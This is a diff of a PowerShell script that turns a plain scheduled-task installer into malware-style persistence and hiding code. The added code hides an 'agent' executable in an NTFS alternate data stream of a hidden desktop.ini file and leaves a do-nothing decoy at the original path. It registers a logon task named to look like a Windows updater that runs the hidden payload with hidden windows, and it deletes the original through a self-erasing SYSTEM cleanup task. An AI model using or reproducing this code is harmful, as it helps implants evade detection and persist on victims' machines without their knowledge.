@@ -6,32 +6,88 @@ if (-not $agentPath) {
     exit
 }
 
-$taskName = "WindowsUpdaterTask"
+# ============================================================
+# 1. Choose carrier file (Public Desktop\desktop.ini)
+# ============================================================
+$publicDesktop = "C:\Users\Public\Desktop"
+$carrierFile = "$publicDesktop\desktop.ini"
+$streamName = "thumbs.db"
 
-try {
-    # Connect to Task Scheduler
-    $taskService = New-Object -ComObject Schedule.Service
-    $taskService.Connect()
-    $rootFolder = $taskService.GetFolder("\")
-
-    # Create a new task definition
-    $taskDefinition = $taskService.NewTask(0)
-    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
-    $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN
-
-    # Create a logon trigger
-    $trigger = $taskDefinition.Triggers.Create(9) # TASK_TRIGGER_LOGON
-    $trigger.UserId = $env:USERNAME
-
-    # Create an action to run the agent
-    $action = $taskDefinition.Actions.Create(0) # TASK_ACTION_EXEC
-    $action.Path = $agentPath
-
-    # Register the task (6 = UpdateOrCreate, 3 = InteractiveToken)
-    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
-
-    Write-Output "✅ Scheduled task '$taskName' created via COM. Agent will run at next logon."
-} catch {
-    Write-Output "❌ Failed to create task: $_"
+# Ensure carrier file exists (create if missing)
+if (-not (Test-Path $carrierFile)) {
+    @"
+[.ShellClassInfo]
+LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21769
+"@ | Out-File -FilePath $carrierFile -Encoding ASCII
+    attrib +h +s $carrierFile
+    Write-Output "[+] Created carrier file: $carrierFile"
+} else {
+    Write-Output "[+] Using existing carrier file: $carrierFile"
 }
+
+# ============================================================
+# 2. Hide real agent in ADS
+# ============================================================
+Write-Output "[+] Reading real agent from: $agentPath"
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
+$hiddenPath = "$carrierFile`:$streamName"
+Write-Output "[+] Real agent hidden in: $hiddenPath"
+
+# ============================================================
+# 3. Create tiny decoy executable at original location
+# ============================================================
+Write-Output "[+] Creating harmless decoy at original location: $agentPath"
+$decoyCode = @'
+using System;
+class Decoy { static void Main() { Environment.Exit(0); } }
+'@
+Add-Type -TypeDefinition $decoyCode -OutputAssembly $agentPath -OutputType ConsoleApplication -ErrorAction Stop
+Write-Output "[+] Decoy created (does nothing when run)."
+
+# ============================================================
+# 4. Create/update scheduled task to run from hidden location
+# ============================================================
+$taskName = "WindowsUpdaterTask"
+$execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
+
+# Delete existing task if any (clean start)
+schtasks /delete /tn $taskName /f 2>$null
+
+# Create new task
+schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
+if ($LASTEXITCODE -eq 0) {
+    Write-Output "[+] Scheduled task '$taskName' created. Agent will run at next logon."
+} else {
+    Write-Output "[-] Failed to create scheduled task."
+}
+
+# ============================================================
+# 5. Clean up original (optional – we keep decoy, delete real)
+# ============================================================
+Start-Sleep -Seconds 2
+Remove-Item -Path $agentPath -Force -ErrorAction SilentlyContinue
+if (-not (Test-Path $agentPath)) {
+    Write-Output "[+] Original agent file deleted (decoy remains)."
+} else {
+    Write-Output "[-] Original agent still exists – will be deleted on next reboot."
+    # Schedule deletion on next boot
+    $tempScript = "$env:TEMP\del_agent.bat"
+    "@echo off
+    :loop
+    del /f /q `"$agentPath`" 2>nul
+    if exist `"$agentPath`" goto loop
+    del /f /q `"%~f0`"
+    " | Out-File $tempScript -Encoding ASCII
+    schtasks /create /tn "TempCleanup" /tr "$tempScript" /sc once /st 00:00 /ru SYSTEM /f | Out-Null
+}
+
+# ============================================================
+# Done
+# ============================================================
+Write-Output ""
+Write-Output "✅ PERSISTENCE AND HIDING COMPLETE"
+Write-Output "===================================="
+Write-Output "Real agent hidden in: $hiddenPath"
+Write-Output "Decoy left at: $agentPath"
+Write-Output "Scheduled task will run hidden agent on next logon."
